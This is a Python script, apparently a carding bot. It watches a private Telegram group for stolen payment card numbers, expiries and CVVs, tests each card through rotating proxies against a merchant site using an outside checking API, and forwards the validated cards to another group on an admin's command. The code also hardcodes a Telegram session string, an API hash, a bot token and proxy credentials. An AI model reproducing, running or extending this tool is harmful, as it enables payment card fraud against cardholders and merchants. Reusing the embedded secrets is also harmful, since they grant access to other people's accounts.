import re
import aiohttp
import asyncio
import random
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telegram import Bot
from telegram.helpers import escape_markdown
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------------- CONFIG ----------------
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="
BOT_TOKEN = "7991358662:AAGQIQFKzKc4bHwJM_Sgt5MZ4nJZ4PhTpes"

PRIVATE_GROUP_ID = -1002682944548
TARGET_GROUP_ID = -1002968335063
ADMIN_ID = 8493360284

API_URL = "https://autosh.arpitchk.shop/puto.php"
SITE = "https://jasonwubeauty.com"

# List of proxies
PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]

NUM_CONCURRENT = 5  # simultaneous API requests

# ---------------- CARD REGEX ----------------
CARD_REGEX = re.compile(
    r"(\d{15,16})\s*[\|/:]?\s*(\d{2})\s*[\|/:]?\s*(\d{2,4})\s*[\|/:]?\s*(\d{3,4})"
)

# ---------------- CLIENTS ----------------
user_client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
bot_client = Bot(token=BOT_TOKEN)
session: aiohttp.ClientSession = None
dropping_enabled = False

# ---------------- SEMAPHORE ----------------
semaphore = asyncio.Semaphore(NUM_CONCURRENT)

# ---------------- FUNCTIONS ----------------
async def check_card(card: str):
    """Process card with API, respecting concurrency"""
    global session
    async with semaphore:
        proxy = random.choice(PROXIES)
        params = {"site": SITE, "cc": card, "proxy": proxy}

        for attempt in range(3):
            try:
                async with session.get(API_URL, params=params, timeout=15) as resp:
                    data = await resp.json()
                    break
            except Exception as e:
                data = {"Response": f"API Error: {e}", "cc": card, "Price": "-", "TotalTime": "-"}
                await asyncio.sleep(1)

        cc = escape_markdown(str(data.get("cc")), version=2)
        price = escape_markdown(str(data.get("Price")), version=2)
        response = escape_markdown(str(data.get("Response")), version=2)
        msg = f"✨ *Card Check Result* ✨\n\n💳 CC: `{cc}`\n💰 Price: {price}\n📊 Response: {response}"

        if dropping_enabled:
            try:
                await bot_client.send_message(chat_id=TARGET_GROUP_ID, text=msg, parse_mode="MarkdownV2")
                print(f"[✓] Sent: {card} -> {data.get('Response')}")
            except Exception as e:
                print(f"❌ Failed to send: {card} -> {e}")
        else:
            print(f"[i] Dropping disabled: {card} -> {data.get('Response')}")

# ---------------- TELETHON EVENT ----------------
@user_client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def card_listener(event):
    text = event.message.message
    if not text:
        return
    matches = CARD_REGEX.findall(text)
    if matches:
        for match in matches:
            card_str = "|".join(match)
            asyncio.create_task(check_card(card_str))
            print(f"[+] Card detected and processing immediately: {card_str}")

# ---------------- TELEGRAM COMMANDS ----------------
async def start(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    await context.bot.send_message(update.effective_chat.id, "✅ Send /drop to start dropping checked CC")

async def drop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    dropping_enabled = True
    await context.bot.send_message(update.effective_chat.id, "✅ Dropping enabled!")

async def stop(update: "Update", context: ContextTypes.DEFAULT_TYPE):
    global dropping_enabled
    if update.effective_user.id != ADMIN_ID:
        await context.bot.send_message(update.effective_chat.id, "❌ Access Denied")
        return
    dropping_enabled = False
    await context.bot.send_message(update.effective_chat.id, "⏹ Dropping stopped.")

# ---------------- MAIN ----------------
async def main():
    global session
    session = aiohttp.ClientSession()

    await user_client.start()
    print("✅ Telethon client started")

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("drop", drop))
    app.add_handler(CommandHandler("stop", stop))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("✅ Telegram bot started. Waiting for admin commands...")

    await user_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
